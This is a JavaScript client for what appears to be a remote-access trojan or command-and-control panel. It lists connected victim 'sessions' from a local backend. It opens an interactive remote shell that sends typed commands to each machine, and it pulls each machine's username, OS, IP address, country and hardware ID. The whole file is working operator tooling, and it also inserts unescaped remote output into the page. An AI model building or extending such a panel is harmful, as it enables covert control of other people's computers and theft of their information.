document.addEventListener("DOMContentLoaded", () => {
    const config = {
        host: "http://127.0.0.1:6666"
    };
    const terminal = document.querySelector(".terminal");
    const terminalOutput = document.getElementById("output");
    const terminalInput = document.getElementById("commandInput");
    const homepage = document.querySelector(".homepage");
    const systemDetailsPage = document.getElementById("system-details");
    const usersList = document.getElementById("users-list");
    let commandHistory = [];
    let historyIndex = 1;
    let currentSession = null;
    let Users = [];
    const commands = {
        "clear": () => {
            terminalOutput.textContent = "";
            return "";
        }
    };
    async function getUsers() {
        const request = await fetch(`${config.host}/getSessions`);    
        const users = await request.json();
        return users
    }
    async function removeUser(session) {
        const userElements = document.querySelectorAll('#users-list .user');
        await fetch(`${config.host}/removeUser`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({session: session})
        })
        userElements.forEach(userElement => {
            const shellButton = userElement.querySelector('.shell-btn');
            const userSession = shellButton.getAttribute('data-session');
            if (userSession === session) {
                userElement.remove();
            }
        });
    }

    async function fetchUsers() {
        try {
            const users = await getUsers();
            let html = "";
            for (const [address, details] of Object.entries(users)) {
                html += 
                    `<div class="user">
                        <div class="username">${details.user}</div>
                        <div class="details" style="display: none;">
                            <p><strong style="color: gray">Session Address:</strong> <span style="color: red">${address}</span></p>
                            <p><strong style="color: gray">Session Start:</strong> <span style="color: red">${details.date}</span></p>
                            <button class="shell-btn" data-session="${address}">Shell</button>
                            <button class="view-system-details-btn" data-session="${address}">View System Details</button>
                        </div>
                    </div>`;
            }
            usersList.innerHTML = html;
            Users = users;
            return users
        } catch (error) {
            console.error("Failed to fetch users:", error);
        }
    }

    document.getElementById("home").addEventListener("click", (e) => {
        e.preventDefault();
        homepage.style.display = "flex";
        document.querySelector(".system-details").style.display = "none";
        terminal.style.display = "none";
        terminalInput.focus();
    });

    terminalInput.addEventListener("keydown", async (e) => {
        if (e.key === "Enter") {
            const command = terminalInput.value.trim();
            if (command) {
                commandHistory.push(command);
                historyIndex = commandHistory.length;
                let response;
                if (commands[command]) {
                    response = commands[command]();
                } else {
                    try {
                        const request = await fetch(`${config.host}/execute`, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({session: currentSession, command: command})
                        });
                        let data = await request.json();
                        if (data.error) {
                            removeUser(currentSession);
                            alert("Connection lost, session terminated...")
                        }
                        response = data.output || data.error || "No output";
                    } catch (error) {
                        response = `Error: ${error.message}`;
                    }
                }
                const formattedCommand = `<span class="prompt">${Users[currentSession].user}:</span><span class="path">~$ ${command}</span>`;
                const formattedResponse = `<div class="output-line">${response}</div>`;
                terminalOutput.innerHTML += `${formattedCommand}\n${formattedResponse}\n`;
                terminalInput.value = "";
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }
            e.preventDefault();
        } else if (e.key === "ArrowUp") {
            if (historyIndex > 0) {
                historyIndex--;
                terminalInput.value = commandHistory[historyIndex];
            }
            e.preventDefault();
        } else if (e.key === "ArrowDown") {
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                terminalInput.value = commandHistory[historyIndex];
            } else {
                historyIndex = commandHistory.length;
                terminalInput.value = "";
            }
            e.preventDefault();
        }
    });

    terminal.addEventListener("click", () => {
        terminalInput.focus();
    });

    fetchUsers().then(users => {
        document.querySelectorAll(".user").forEach(user => {
            user.addEventListener("click", () => {
                const details = user.querySelector(".details");
                details.style.display = details.style.display === "none" ? "block" : "none";
            });
        });

        document.querySelectorAll(".shell-btn").forEach(button => {
            button.addEventListener("click", (e) => {
                e.preventDefault();
                currentSession = button.getAttribute("data-session");
                homepage.style.display = "none";
                terminal.style.display = "flex";
                commands["clear"]();
                document.querySelector(".prompt").textContent = users[currentSession].user
                terminalInput.focus();
            });
        });
        document.querySelectorAll(".view-system-details-btn").forEach(button => {
            button.addEventListener("click", (e) => {
                e.preventDefault();
                currentSession = button.getAttribute("data-session");
                homepage.style.display = "none";
                terminal.style.display = "none";
                document.querySelector(".system-details").style.display = "flex";
                fetch(`${config.host}/execute`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({session: currentSession, command: "getInfo"})
                }).then(request => {
                    request.json().then(response => {
                        if (response.error) {
                            document.querySelector(".system-details").innerHTML = "<h1>Session terminated</h1>"
                            removeUser(currentSession)
                        } else {
                            var data = JSON.parse(response.output)
                            systemDetailsPage.innerHTML = `<div id="system-details"><p><strong>User:</strong> <span data-user="user">${data.username}</span></p><p><strong>System:</strong> <span data-system="system">${data.system}</span></p><p><strong>IP:</strong> <span data-ip="ip">${data.ip}</span></p>    <p><strong>Country:</strong> <span data-country="country">${data.country}</span></p><p><strong>HWID:</strong> <span data-hwid="hwid" >${data.hwid}</span></p></div>`;
                        }
                    })
                })
            });
        });
    });

});
